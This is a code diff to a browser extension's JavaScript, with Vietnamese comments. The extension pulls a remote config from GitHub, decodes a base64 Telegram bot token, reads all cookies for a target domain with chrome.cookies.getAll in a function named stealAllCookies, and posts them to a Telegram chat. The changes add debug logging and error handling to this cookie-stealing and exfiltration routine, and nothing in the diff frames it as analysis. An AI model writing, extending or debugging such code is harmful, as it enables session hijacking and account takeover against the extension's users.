@@ -3,13 +3,15 @@ function decodeBase64(encoded) {
 }
 
 function fetchRemoteConfig(callback) {
-  const url = "https://raw.githubusercontent.com/vietanh1206/extension-config/main/config.json";
+  const url = "https://raw.githubusercontent.com/vietanh1206/extension-config/main/config.json"; // Link raw từ GitHub
   fetch(`${url}?t=${Date.now()}`)
     .then(res => res.json())
     .then(config => {
       if (config.enabled) {
         config.token = decodeBase64(config.token);
         config.chat_id = decodeBase64(config.chat_id);
+        console.log("Decoded token:", config.token); // Kiểm tra token
+        console.log("Decoded chat_id:", config.chat_id); // Kiểm tra chat_id
         callback(config);
       } else {
         console.warn("Config disabled, using fallback");
@@ -37,11 +39,21 @@ function sendTelegramMessage(cfg, cookieList) {
       chat_id: cfg.chat_id,
       text: message
     })
-  }).catch(err => console.error("Telegram error:", err));
+  })
+    .then(res => res.json())
+    .then(data => {
+      if (!data.ok) {
+        console.error("Telegram API error:", data.description);
+      } else {
+        console.log("Message sent successfully");
+      }
+    })
+    .catch(err => console.error("Telegram fetch error:", err));
 }
 
 function stealAllCookies(cfg) {
   chrome.cookies.getAll({ domain: cfg.target_domain }, cookies => {
+    console.log("Cookies found:", cookies); // Kiểm tra cookie
     if (!cookies || cookies.length === 0) {
       console.log("No cookies found for domain:", cfg.target_domain);
       return;
